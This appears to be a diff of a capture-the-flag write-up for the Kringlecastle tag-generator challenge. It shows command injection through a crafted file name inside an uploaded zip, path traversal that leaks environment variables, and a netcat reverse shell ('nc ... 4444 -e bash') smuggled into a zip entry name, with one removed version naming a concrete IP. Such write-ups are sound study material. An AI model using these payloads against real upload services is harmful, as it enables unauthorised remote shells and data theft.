@@ -38,7 +38,6 @@ jsw@io:*$ zip joergen.zip \'\`env\>joergen\`\;\'.jpg
   adding: '`env>joergen`;'.jpg (stored 0%)
 jsw@io:*$ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ["7ebc17be-a3ea-48f5-95ea-730e1b006520.jpg"]
-jsw@io:*$ sleep 5
 jsw@io:*$ curl https://tag-generator.kringlecastle.com/image?id=../tmp/joergen
 RUBY_MAJOR=2.7
 GREETZ=JackFrostWasHere
@@ -57,8 +56,7 @@ zip joergen.zip joergen.jpg
 ```
 Modify the contained filename to one with a shell command:
 ```
-printf "@ joergen.jpg\n@=\';nc <your IP address>.211.52.129 4444 -e \`which bash\`;#'.jpg\n" | zipnote -w joergen.zip
-
+printf "@ joergen.jpg\n@=\';nc <your IP address> 4444 -e \`which bash\`;#'.jpg\n" | zipnote -w joergen.zip
 ```
 
 Start the reverse shell listener on your local device:
@@ -70,15 +68,8 @@ Get it started:
 curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
 ```
 Now you have in the reverse shell listener an interactive shell as user `app`.
-
-```
-touch joergen.jpg
-zip joergen.zip joergen.jpg
-printf "@ joergen.jpg\n@=\';nc 93.211.52.129 4444 -e \`which bash\`;#'.jpg\n" | zipnote -w joergen.zip
-curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
-```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTk2NTY5MDk3MiwtODIzMDUwODYxLDEyOT
+eyJoaXN0b3J5IjpbMTYwNzM0ODUxNCwtODIzMDUwODYxLDEyOT
 M3MjA0MzksMTM5NTc5NDgyNCwtMTU5OTI1NDQxNSwtNjE5Mjk3
 NDExLC01NzY2MTAwNzUsMjEwNzUyOTg0Niw5MjIxNDQzNSwtMz
 k4NDkxNDYxLDExNTE1NTY4OTYsMjM4NDYwMjcyLDE5MzMzNjE3
